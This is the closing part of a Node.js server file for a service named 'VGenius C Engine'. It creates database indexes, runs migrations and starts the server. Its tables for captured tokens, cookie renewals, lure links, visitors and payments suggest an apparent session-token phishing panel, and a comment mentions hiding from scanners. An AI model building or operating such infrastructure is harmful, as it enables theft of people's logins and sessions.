      'CREATE INDEX IF NOT EXISTS idx_captured_tokens_deleted ON captured_tokens(user_id, deleted, created_at)',
      'CREATE INDEX IF NOT EXISTS idx_links_user_id ON links(user_id)',
      'CREATE INDEX IF NOT EXISTS idx_links_worker_name ON links(worker_name)',
      'CREATE INDEX IF NOT EXISTS idx_visitors_user_id ON visitors(user_id)',
      'CREATE INDEX IF NOT EXISTS idx_visitors_link_id ON visitors(link_id)',
      'CREATE INDEX IF NOT EXISTS idx_payments_user_id ON payments(user_id)',
      'CREATE INDEX IF NOT EXISTS idx_cookie_renewals_capture_id ON cookie_renewals(capture_id)',
      'CREATE INDEX IF NOT EXISTS idx_cookie_renewals_user_id ON cookie_renewals(user_id)',
      'CREATE INDEX IF NOT EXISTS idx_deployment_logs_link_id ON deployment_logs(link_id)',
      'CREATE INDEX IF NOT EXISTS idx_login_history_user_id ON login_history(user_id)',
      'CREATE INDEX IF NOT EXISTS idx_login_history_admin_id ON login_history(admin_id)',
      'CREATE INDEX IF NOT EXISTS idx_feedback_user_id ON feedback(user_id)',
      'CREATE INDEX IF NOT EXISTS idx_user_sessions_user_id ON user_sessions(user_id)',
      'CREATE INDEX IF NOT EXISTS idx_user_sessions_token ON user_sessions(session_token)',
      'CREATE INDEX IF NOT EXISTS idx_sub_users_parent ON sub_users(parent_user_id)',
    ];
    for (const stmt of indexStatements) {
      try { await db.query(stmt); } catch (e) { /* index may already exist */ }
    }
    console.log('[DB] All migrations and indexes applied successfully');
  } catch (err) {
    console.error('[DB] Migration error (non-fatal):', err.message);
  }
}
runMigrations().catch(err => console.error('[DB] Migration failed:', err.message));

// Serve a harmless static page for unknown routes / scanners
app.use((req, res) => res.status(404).sendFile(path.join(__dirname, 'admin-panel', '404.html')));

// --- Start Server ---
server.listen(config.PORT, () => {
  console.log(`[VGenius C Engine] Running on port ${config.PORT}`);
  console.log(`[VGenius C Engine] Environment: ${config.NODE_ENV}`);
});
